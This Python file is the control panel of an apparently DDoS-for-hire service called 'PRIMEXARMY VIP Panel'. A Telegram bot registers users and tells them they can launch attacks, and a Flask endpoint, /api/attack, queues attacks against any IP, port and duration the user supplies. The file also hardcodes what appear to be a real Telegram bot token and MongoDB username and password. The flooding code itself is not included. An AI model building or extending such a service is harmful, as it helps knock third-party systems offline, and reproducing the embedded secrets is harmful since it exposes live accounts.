import os
import telebot
import pymongo
import threading
from flask import Flask, request, jsonify

app = Flask(__name__)

# --- CONFIGURATION ---
# Inhe Railway Variables mein set karein: API_KEY, MONGO_URL
BOT_TOKEN = os.getenv("API_KEY", "8260300681:AAHuMKtU0ly4b3vOuAIUvKD9u6LqaF_fQhQ")
MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://pramil:cSnJK0jIZ9FSfIAF@cluster0.ycf4z0g.mongodb.net/?retryWrites=true&w=majority")
ADMIN_ID = 7633157105

bot = telebot.TeleBot(BOT_TOKEN)
client = pymongo.MongoClient(MONGO_URL)
db = client['v43_db']
users_col = db['users']
attacks_col = db['attacks']

# --- WEB API ---
@app.route('/api/attack', methods=['GET'])
def trigger_attack():
    uid = request.args.get('uid')
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_val = request.args.get('time')

    if not all([uid, ip, port, time_val]):
        return jsonify({"status": "failed", "error": "Missing params"}), 400

    attacks_col.insert_one({
        "uid": int(uid), 
        "ip": ip, 
        "port": int(port),
        "time": int(time_val), 
        "status": "pending"
    })
    return jsonify({"status": "success", "msg": "PRIMEXARMY: Attack Queued!"})

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['broadcast'])
def broadcast(m):
    if m.from_user.id == ADMIN_ID:
        text = m.text.replace('/broadcast ', '')
        if text == '/broadcast' or not text:
            bot.reply_to(m, "❌ Message likho: `/broadcast Hello`")
            return
        users = users_col.find()
        for u in users:
            try: bot.send_message(u['uid'], f"📢 **ADMIN MESSAGE:**\n\n{text}")
            except: continue
        bot.reply_to(m, "✅ Broadcast Sent!")

@bot.message_handler(commands=['users'])
def user_count(m):
    if m.from_user.id == ADMIN_ID:
        count = users_col.count_documents({})
        bot.reply_to(m, f"📊 Total Users: {count}")

# --- USER COMMANDS ---
@bot.message_handler(commands=['start'])
def welcome(m):
    uid = m.from_user.id
    # User ko DB mein register karna agar nahi hai
    if not users_col.find_one({"uid": uid}):
        users_col.insert_one({"uid": uid, "status": "active"})
    
    # Bina kisi condition ke welcome message
    bot.reply_to(m, "🔥 **Welcome to PRIMEXARMY VIP Panel!**\n\nAapka access active hai. Aap niche diye gaye link se attack launch kar sakte hain.")

if __name__ == "__main__":
    # Bot aur Flask ko ek saath chalana
    threading.Thread(target=bot.infinity_polling).start()
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))